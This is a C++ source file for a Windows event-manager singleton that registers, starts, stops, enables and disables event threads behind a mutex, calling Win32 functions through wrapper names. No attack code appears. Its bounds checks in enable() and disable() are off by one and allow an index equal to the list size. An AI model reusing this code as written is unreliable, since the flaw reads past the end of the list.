#include "EventsManager.h"
#include "Event.h"
#include "FunctionFunc.h"

EventsManager* EventsManager::Instance = NULL;
volatile LONG EventsManager::lLock = 0;

EventsManager* EventsManager::self() {
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		_Sleep(1);

	if (Instance == NULL)
		Instance = new(std::nothrow) EventsManager();

	InterlockedExchange((LPLONG)&lLock, 0);

	return Instance;
}

EventsManager::EventsManager() : hMutex(NULL) {
	hMutex = _CreateMutexW(NULL, FALSE, NULL);

	if (hMutex == NULL)
		throw new exception();
}

EventsManager::~EventsManager() {
	clear();

	if (hMutex != NULL)
		CloseHandle(hMutex);
}

void EventsManager::clear() {
	vector<Event *>::const_iterator iter;

	lock();

	for (iter = eventsList.begin(); iter != eventsList.end(); iter++) {
		delete *iter;
	}

	eventsList.clear();

	unlock();
}

void EventsManager::lock() {
	_WaitForSingleObject(hMutex, INFINITE);
}

void EventsManager::unlock() {
	ReleaseMutex(hMutex);
}

BOOL EventsManager::add(const wstring& eventName, JSONObject jConf, void* threadProc) {
	if (eventName.empty() || threadProc == NULL)
		return FALSE;

	lock();

	Event* mod = new Event(threadProc, new Configuration(jConf));
	eventsList.push_back(mod);

	unlock();

	return TRUE;
}

BOOL EventsManager::startAll() {
	vector<Event *>::const_iterator iter;
	BOOL running = FALSE;

	lock();

	for (iter = eventsList.begin(); iter != eventsList.end(); ++iter) {
		Event* module = *iter;

		if (module->isEnabled()) {
			running = module->run();

			if (running == FALSE)
				break;

			_Sleep(100);
		}
	}

	unlock();

	return running;
}

BOOL EventsManager::stopAll() {
	vector<Event *>::const_iterator iter;
	BOOL running = FALSE;

	lock();

	for (iter = eventsList.begin(); iter != eventsList.end(); ++iter) {
		Event* module = *iter;

		module->stop();
	}

	unlock();

	return running;
}

BOOL EventsManager::enable(INT eventIndex) {
	if (eventIndex < 0 || (INT)eventsList.size() < eventIndex)
		return FALSE;

	lock();

	Event* module;

	try {
		module = eventsList[eventIndex];
	} catch (...) {
		module = NULL;
	}

	// Module absent
	if (module == NULL) {
		unlock();
		return FALSE;
	}

	UINT status = module->getStatus();

	if (status == EVENT_RUNNING) {
		unlock();
		return TRUE;
	}

	if (module->run() == FALSE) {
		unlock();
		return FALSE;
	}

	unlock();
	return TRUE;
}

BOOL EventsManager::disable(INT eventIndex) {
	if (eventIndex < 0 || (INT)eventsList.size() < eventIndex)
		return FALSE;

	lock();

	Event* module;
	
	try {
		module = eventsList[eventIndex];
	} catch (...) {
		module = NULL;
	}

	if (module == NULL) {
		// WARNING
		unlock();
		return FALSE;
	}

	module->stop();

	if (module->getStatus() != EVENT_STOPPED) {
		unlock();
		return FALSE;
	}

	unlock();
	return TRUE;
}

#ifdef _DEBUG
void EventsManager::dumpEvents() {
	WCHAR msg[128];
	vector<Event *>::const_iterator iter;

	lock();

	//wprintf(L"Dumping Events:\n");
	OutputDebugString(L"Dumping Events:\n");

	for (iter = eventsList.begin(); iter != eventsList.end(); ++iter) {
		//wprintf(L"%s\n", (*iter)->getName().c_str());
		swprintf_s(msg, L"%s\n", (*iter)->getName().c_str());OutputDebugString(msg);
	}

	unlock();
}
#endif